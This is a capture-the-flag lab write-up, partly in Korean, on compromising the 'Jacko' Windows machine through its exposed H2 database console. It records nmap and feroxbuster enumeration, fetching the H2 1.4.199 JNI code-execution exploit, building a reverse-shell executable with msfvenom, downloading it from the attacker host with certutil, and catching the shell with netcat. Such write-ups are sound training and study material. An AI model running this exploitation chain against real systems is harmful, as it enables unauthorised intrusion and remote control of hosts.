## Nmap
```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ cat nmap.log
# Nmap 7.98 scan initiated Fri Jul 10 15:38:25 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.120.66
Nmap scan report for 192.168.120.66
Host is up (0.087s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9092-TCP:V=7.98%I=7%D=7/10%Time=6A509371%P=x86_64-pc-linux-gnu%r(NU
SF:LL,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\
SF:0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i
SF:\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0
SF:l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\
SF:0h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\
SF:.\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n
SF:\0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0
SF:R\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x
SF:20\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\
SF:x20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0
SF:o\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\
SF:x009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0
SF:a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0
SF:S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n
SF:\0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g
SF:\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o
SF:\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D
SF:\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\
SF:r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.
SF:\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p
SF:\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\
SF:x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b")%r(informi
SF:x,516,"\0\0\0\0\0\0\0\x05\x009\x000\x001\x001\x007\0\0\0F\0R\0e\0m\0o\0
SF:t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x20\0t\0h\0i\
SF:0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x20\0a\0l\0l
SF:\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o\0w\0O\0t\0
SF:h\0e\0r\0s\xff\xff\xff\xff\0\x01`\x05\0\0\x024\0o\0r\0g\0\.\0h\x002\0\.
SF:\0j\0d\0b\0c\0\.\0J\0d\0b\0c\0S\0Q\0L\0N\0o\0n\0T\0r\0a\0n\0s\0i\0e\0n\
SF:0t\0C\0o\0n\0n\0e\0c\0t\0i\0o\0n\0E\0x\0c\0e\0p\0t\0i\0o\0n\0:\0\x20\0R
SF:\0e\0m\0o\0t\0e\0\x20\0c\0o\0n\0n\0e\0c\0t\0i\0o\0n\0s\0\x20\0t\0o\0\x2
SF:0\0t\0h\0i\0s\0\x20\0s\0e\0r\0v\0e\0r\0\x20\0a\0r\0e\0\x20\0n\0o\0t\0\x
SF:20\0a\0l\0l\0o\0w\0e\0d\0,\0\x20\0s\0e\0e\0\x20\0-\0t\0c\0p\0A\0l\0l\0o
SF:\0w\0O\0t\0h\0e\0r\0s\0\x20\0\[\x009\x000\x001\x001\x007\0-\x001\x009\x
SF:009\0\]\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a
SF:\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S
SF:\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\
SF:0\.\0j\0a\0v\0a\0:\x006\x001\x007\0\)\0\r\0\n\0\t\0a\0t\0\x20\0o\0r\0g\
SF:0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\
SF:0n\0\.\0g\0e\0t\0J\0d\0b\0c\0S\0Q\0L\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\(\0D\
SF:0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x004\x002\x007\0\)\0\r
SF:\0\n\0\t\0a\0t\0\x20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\
SF:0D\0b\0E\0x\0c\0e\0p\0t\0i\0o\0n\0\.\0g\0e\0t\0\(\0D\0b\0E\0x\0c\0e\0p\
SF:0t\0i\0o\0n\0\.\0j\0a\0v\0a\0:\x002\x000\x005\0\)\0\r\0\n\0\t\0a\0t\0\x
SF:20\0o\0r\0g\0\.\0h\x002\0\.\0m\0e\0s\0s\0a\0g\0e\0\.\0D\0b");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=7/10%OT=80%CT=1%CU=30824%PV=Y%DS=4%DC=T%G=Y%TM=6A50942
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%TS=U)
OS:SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=FF%GCD=1%ISR=10D%TI=I%CI=
OS:I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578N
OS:W8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-07-10T06:41:36
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   86.69 ms 192.168.45.1
2   86.68 ms 192.168.45.254
3   87.06 ms 192.168.251.1
4   87.11 ms 192.168.120.66

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 10 15:41:50 2026 -- 1 IP address (1 host up) scanned in 205.28 seconds
```

```
"certutil -urlcache -split -f http://[Kali IP]/shell.exe C:/Windows/Temp/shell.exe"
```



```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ feroxbuster -u http://192.168.120.66/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.120.66/
 🚩  In-Scope Url          │ 192.168.120.66
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [html, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      150c http://192.168.120.66/help => http://192.168.120.66/help/
301      GET        2l       10w      152c http://192.168.120.66/images => http://192.168.120.66/images/
200      GET       46l      151w     1455c http://192.168.120.66/html/main.html
200      GET       44l      182w     1595c http://192.168.120.66/index.html
200      GET      379l      692w     5971c http://192.168.120.66/html/stylesheet.css
200      GET       44l      182w     1595c http://192.168.120.66/
301      GET        2l       10w      150c http://192.168.120.66/html => http://192.168.120.66/html/
403      GET       29l       92w     1233c http://192.168.120.66/text/
403      GET       29l       92w     1233c http://192.168.120.66/html/
301      GET        2l       10w      157c http://192.168.120.66/html/images => http://192.168.120.66/html/images/
200      GET      195l      644w     6008c http://192.168.120.66/html/navigation.js
200      GET      708l     2458w    22700c http://192.168.120.66/html/links.html
200      GET      325l     1591w    14266c http://192.168.120.66/html/build.html
200      GET      893l     5360w    40969c http://192.168.120.66/html/performance.html
200      GET     1719l     9513w    73694c http://192.168.120.66/html/features.html
200      GET     1487l     7328w    52442c http://192.168.120.66/html/changelog.html
200      GET       76l      197w     2899c http://192.168.120.66/html/download.html
200      GET     1502l     7485w    58013c http://192.168.120.66/html/tutorial.html
200      GET     1968l    11802w    89524c http://192.168.120.66/html/advanced.html
200      GET      288l     1694w    13240c http://192.168.120.66/html/faq.html
200      GET      105l      464w     3873c http://192.168.120.66/html/quickstart.html
200      GET      178l      391w     5083c http://192.168.120.66/html/grammar.html
200      GET       99l      233w     2884c http://192.168.120.66/html/datatypes.html
200      GET      189l     1242w   105089c http://192.168.120.66/html/images/connection-mode-remote-2.png
200      GET      176l     1099w    86253c http://192.168.120.66/html/images/connection-mode-embedded-2.png
200      GET      261l     1539w   126490c http://192.168.120.66/html/images/connection-mode-mixed-2.png
200      GET      182l      749w     6831c http://192.168.120.66/html/history.html
301      GET        2l       10w      150c http://192.168.120.66/text => http://192.168.120.66/text/
200      GET       52l      199w     1366c http://192.168.120.66/html/source.html
200      GET       58l      297w    21408c http://192.168.120.66/html/images/db-64-t.png
200      GET      404l     4638w    31361c http://192.168.120.66/html/license.html
200      GET      221l     1449w   124258c http://192.168.120.66/html/images/console-2.png
200      GET      179l      395w     5151c http://192.168.120.66/html/commands.html
200      GET      532l     5166w    41042c http://192.168.120.66/html/roadmap.html
200      GET       40l      158w     1334c http://192.168.120.66/html/frame.html
200      GET      154l      581w     5535c http://192.168.120.66/html/architecture.html
200      GET      122l      367w     3719c http://192.168.120.66/html/installation.html
200      GET        1l        2w      186c http://192.168.120.66/html/images/icon_disconnect.gif
200      GET      250l      847w    54735c http://192.168.120.66/html/images/quickstart-6.png
200      GET       25l      306w    20922c http://192.168.120.66/html/images/quickstart-3.png
200      GET       12l       84w     6917c http://192.168.120.66/html/images/quickstart-2.png
200      GET      213l      682w    53950c http://192.168.120.66/html/images/quickstart-4.png
200      GET       56l      330w    25271c http://192.168.120.66/html/images/quickstart-1.png
200      GET      267l      767w    64736c http://192.168.120.66/html/images/quickstart-5.png
200      GET      324l      686w     9218c http://192.168.120.66/html/functions.html
200      GET      749l     5113w    33189c http://192.168.120.66/html/mvstore.html
200      GET       24l      148w     8398c http://192.168.120.66/html/images/h2-logo-2.png
200      GET      216l      545w     6760c http://192.168.120.66/html/cheatSheet.html
200      GET      273l      939w     8212c http://192.168.120.66/html/search.js
200      GET      252l      820w     7734c http://192.168.120.66/html/sourceError.html
200      GET       24l       78w      862c http://192.168.120.66/javadoc/index.html
200      GET       63l      340w     2578c http://192.168.120.66/html/systemtables.html
200      GET      130l      369w     5001c http://192.168.120.66/html/fragments.html
200      GET       98l      311w     5241c http://192.168.120.66/javadoc/classes.html
200      GET       38l      122w     1115c http://192.168.120.66/javadoc/overview.html
200      GET      171l      283w     2165c http://192.168.120.66/javadoc/stylesheet.css
200      GET       24l       78w      862c http://192.168.120.66/javadoc/
301      GET        2l       10w      153c http://192.168.120.66/javadoc => http://192.168.120.66/javadoc/
[###################>] - 18m  4246480/4360635 31s     found:58      errors:0
[###################>] - 18m   613254/622887  563/s   http://192.168.120.66/
[####################] - 20m  4360635/4360635 0s      found:58      errors:0
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/help/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/text/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/html/images/
[####################] - 18m   622887/622887  563/s   http://192.168.120.66/javadoc/   

```


8082 port 접근
![[Pasted image 20260710161232.png]]

H2 초기 패스워드 확인
![[Pasted image 20260710161258.png]]

접근 후 H2 버전 확인
![[Pasted image 20260710161324.png]]

H2 1.4.199 취약점 exploit 확보보
```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit h2 1.4.199
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
H2 Database 1.4.199 - JNI Code Execution                            | java/local/49384.txt
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[~/PG/Jacko]
└─$ searchsploit -m 49384
  Exploit: H2 Database 1.4.199 - JNI Code Execution
      URL: https://www.exploit-db.com/exploits/49384
     Path: /usr/share/exploitdb/exploits/java/local/49384.txt
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (64895)
Copied to: /home/kali/PG/Jacko/49384.txt
```

write 부분 입력
![[Pasted image 20260710162803.png]]

load 부분 입력
![[Pasted image 20260710162836.png]]


리버스쉘 생성
```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

리버스쉘 업로드
![[Pasted image 20260710161044.png]]

certutil로 접근
```bash
"certutil -urlcache -split -f http://192.168.45.215/reverse.exe C:\\Users\\tony\\Desktop\\reverse.exe"
```
![[Pasted image 20260710162931.png]]

```bash
"C:\\Users\\tony\\Desktop\\reverse.exe"
```
![[Pasted image 20260710170436.png]]

리버스쉘 획득 후 flag확인
```bash
┌──(kali㉿kali)-[~/PG/Jacko]
└─$ rlwrap nc -lnvp 8082
listening on [any] 8082 ...
connect to [192.168.45.215] from (UNKNOWN) [192.168.120.66] 50180
Microsoft Windows [Version 10.0.18363.836]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\H2\service>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

![[Pasted image 20260710170741.png]]

